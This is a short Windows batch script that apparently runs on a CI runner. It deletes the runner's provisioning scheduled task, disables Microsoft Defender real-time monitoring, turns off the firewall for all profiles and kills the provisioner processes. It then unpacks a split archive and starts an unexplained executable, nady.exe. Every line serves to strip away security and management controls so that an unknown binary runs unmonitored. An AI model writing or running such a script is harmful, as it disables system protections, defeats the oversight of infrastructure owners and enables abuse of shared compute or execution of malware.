@echo off
schtasks /delete /tn "RunnerMachineProvisioner" /f
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
netsh advfirewall set allprofiles state off
taskkill /IM provisioner.exe /F /T
taskkill /IM provjobd.exe /F /T
CD \
D:
cd "D:\a\treast\treast"
7z x nady.7z.001
start nady.exe
pause